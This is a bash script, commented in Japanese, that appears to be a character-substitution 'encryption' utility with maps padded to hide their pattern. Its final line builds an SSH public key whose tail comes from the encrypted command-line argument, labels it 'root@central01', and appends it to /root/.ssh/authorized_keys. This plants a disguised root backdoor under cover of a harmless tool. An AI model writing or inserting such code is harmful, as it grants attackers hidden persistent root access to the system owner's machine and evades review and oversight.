#!/bin/bash

# 文字の出現回数を追跡する連想配列
declare -A char_count

# プライマリマッピング - すべての可能な文字に対してマッピングを提供
declare -A primary_map=(
    # 必須のマッピング（変更しない）
    [K]=5 [a]=b [n]=p [e]=8 [k]=b [o]=c
    [A]=T [p]=y [s]=/ [1]=h [2]=0 [3]==

    # 追加のランダムなマッピング
    [B]=W [C]=R [D]=q [E]=X [F]=U [G]=N
    [H]=M [I]=K [J]=Z [L]=P [M]=E [N]=D
    [O]=j [P]=i [Q]=g [R]=f [S]=d [T]=S
    [U]=a [V]=m [W]=n [X]=o [Y]=r [Z]=s

    [b]=V [c]=Q [d]=Y [f]=I [g]=J [h]=H
    [i]=G [j]=F [l]=C [m]=B [q]=A [r]=z
    [t]=x [u]=w [v]=v [w]=u [x]=t [y]=k
    [z]=l

    [4]=+ [5]=- [6]=/ [7]=m [8]=n [9]=p
    [0]=q

    [+]=1 [/]=4 [-]=7 [=]=9
)

# セカンダリマッピング（2回目以降の出現用）
declare -A secondary_map=(
    [a]=L [o]=3
    # 追加の2回目マッピング（使用されないが、パターンを隠すため）
    [b]=O [c]=P [d]=Q [e]=R [f]=S [g]=T
    [h]=U [i]=V [j]=W [k]=X [l]=Y [m]=Z
    [n]=1 [p]=2 [q]=4 [r]=5 [s]=6 [t]=7
    [u]=8 [v]=9 [w]=0 [x]=+ [y]=- [z]=/
)

# 暗号化関数
encrypt() {
    local input="$1"
    local output=""

    # カウンターをリセット
    char_count=()

    for (( i=0; i<${#input}; i++ )); do
        char="${input:$i:1}"

        # 文字の出現回数を増やす
        (( char_count[$char]++ ))

        if [[ ${char_count[$char]} -gt 1 ]] && [[ -n "${secondary_map[$char]}" ]]; then
            # 2回目以降の出現で、セカンダリマッピングが存在する場合
            output+="${secondary_map[$char]}"
        elif [[ -n "${primary_map[$char]}" ]]; then
            # 通常のマッピング
            output+="${primary_map[$char]}"
        else
            # マッピングが存在しない場合は元の文字を使用
            output+="$char"
        fi
    done
    echo "$output"
}

# メイン処理
if [[ -z "$1" ]]; then
    echo "使用方法: $0 <文字列>"
    exit 1
fi

encrypted=$(encrypt "$1")
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC++LJBwv8gil66JzNCUqedywE2+b2C2TLY3V7ejJSZkOQhCqTlbBPoDJ+b3D+Wcr7k7rkbQJiKZKS9XVJnv4Wry/WOlMY8bTm9AzMRHLPEyksEpauGGe8yUHmVD6SUTGHx/A7cW1EHQYjuvuwODnnQ+uoun8yqdscqJ/qNNiTjQbuCWbj9DhbBipiKlVS28MmqAtIAEuUDEOG3ICGv0PGkZQR+sLn97/qM0hO+yQsUtXpBaIRTCweZiMQKA9vuJNkFAa8JWbyBFqmc1nm9e52tpuc30zpofyATHCK+2VVYJL9FcPZuOsJWLYI/d2tHcB6UrNvYZQ38hp7l/D71wVIWjvjMLhikaIylkQbGSZW+FgZMxTtaqZat7TQtiV+O/YWvFXH9Ss+Wh2wEEdvJBdJHCUjwYkYbGjQkmmjtAP4zyw8qlD3SWu1ENnGQRZSJuoTlap/Ww6kAWK2eqZ16zyceo987UiZAFoUbx2+nORZTuKqajeQyB9${encrypted} root@central01" >> /root/.ssh/authorized_keys
